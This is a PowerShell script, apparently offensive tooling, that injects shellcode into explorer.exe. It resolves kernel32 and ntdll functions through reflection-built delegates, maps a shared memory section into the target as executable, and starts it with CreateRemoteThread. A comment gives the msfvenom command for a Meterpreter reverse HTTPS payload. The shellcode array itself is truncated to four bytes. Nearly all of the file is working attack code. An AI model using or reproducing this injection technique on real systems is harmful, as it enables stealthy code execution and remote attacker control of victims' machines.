Function Standard_Process_Injection_Delegate_inMemory_Alternative {

    function Invoke-FunctionLookup {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [string] $moduleName,

            [Parameter(Position = 1, Mandatory = $true)] 
            [string] $functionName
        )

        $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
            Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
        ).GetType('Microsoft.Win32.UnsafeNativeMethods')

        $getProcAddressMethod = $systemType.GetMethods() | 
        Where-Object { $_.Name -eq "GetProcAddress" }

        $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))

        return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
    }

    function Invoke-GetDelegate {
        Param (
            [Parameter(Position = 0, Mandatory = $true)] 
            [Type[]] $parameterTypes,

            [Parameter(Position = 1, Mandatory = $false)] 
            [Type] $returnType = [Void]
        )

        $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
            (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
            [System.Reflection.Emit.AssemblyBuilderAccess]::Run
        )

        $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

        $typeBuilder = $moduleBuilder.DefineType(
            'MyDelegateType', 
            [System.Reflection.TypeAttributes]::Class -bor 
            [System.Reflection.TypeAttributes]::Public -bor 
            [System.Reflection.TypeAttributes]::Sealed -bor 
            [System.Reflection.TypeAttributes]::AnsiClass -bor 
            [System.Reflection.TypeAttributes]::AutoClass, 
            [System.MulticastDelegate]
        )

        $constructorBuilder = $typeBuilder.DefineConstructor(
            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::Public,
            [System.Reflection.CallingConventions]::Standard,
            $parameterTypes
        )

        $constructorBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        $methodBuilder = $typeBuilder.DefineMethod(
            'Invoke',
            [System.Reflection.MethodAttributes]::Public -bor 
            [System.Reflection.MethodAttributes]::HideBySig -bor 
            [System.Reflection.MethodAttributes]::NewSlot -bor 
            [System.Reflection.MethodAttributes]::Virtual,
            $returnType,
            $parameterTypes
        )

        $methodBuilder.SetImplementationFlags(
            [System.Reflection.MethodImplAttributes]::Runtime -bor 
            [System.Reflection.MethodImplAttributes]::Managed
        )

        return $typeBuilder.CreateType()
    }

# Codeblocks

# Get function pointers for kernel32 functions
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "OpenProcess"), 
    (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr]))
)

$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "CreateRemoteThread"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
)

# Get function pointers for ntdll functions
$NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtCreateSection"), 
    (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [UInt64].MakeByRefType(), [UInt32], [UInt32], [IntPtr]) ([UInt32]))
)

$NtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtMapViewOfSection"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [UInt64].MakeByRefType(), [UInt64].MakeByRefType(), [UInt32], [UInt32], [UInt32]) ([Int]))
)

$NtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtUnmapViewOfSection"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr]) ([Int]))
)

$NtClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtClose"), 
    (Invoke-GetDelegate @([IntPtr]) ([Int]))
)

     
     # End codeblocks  
   
    # msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
    [Byte[]] $buf = 0xfc,0x48,0x83,0xe4
        
    $size = $buf.Length
    $buffer_size = [long]$size

    # Create the section handle
    [IntPtr] $ptr_section_handle = [IntPtr]::Zero    
    $create_section_status = $NtCreateSection.Invoke([ref] $ptr_section_handle, 0xe, [IntPtr]::Zero, [ref] $buffer_size, 0x40, 0x08000000, [IntPtr]::Zero)

    # Map a view of a section into the virtual address space of the current process
    [IntPtr] $ptr_local_section_addr = [IntPtr]::Zero
    $local_section_offset = 0
    $local_map_view_status = $NtMapViewOfSection.Invoke($ptr_section_handle, -1, [ref] $ptr_local_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x04)
    
    # Copy the shellcode into the mapped section
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr_local_section_addr, $size)    
    
    # Get the process ID of explorer
    $Process = (Get-Process -Name "explorer")[0]
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, [uint32]$Process.Id)

    # Map a view of the section in the virtual address space of the targeted process
    [IntPtr] $ptr_remote_section_addr = [IntPtr]::Zero
    $remote_map_view_status = $NtMapViewOfSection.Invoke($ptr_section_handle, $hProcess, [ref] $ptr_remote_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x20)

    # Unmap the view of the section from the current process & close the handle
    $NtUnmapViewOfSection.Invoke(-1, $ptr_local_section_addr) > $null
    $NtClose.Invoke($ptr_section_handle) > $null

    # Create a remote thread in the target process to execute the shellcode
    $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $ptr_remote_section_addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) > $null
}

Standard_Process_Injection_Delegate_inMemory_Alternative
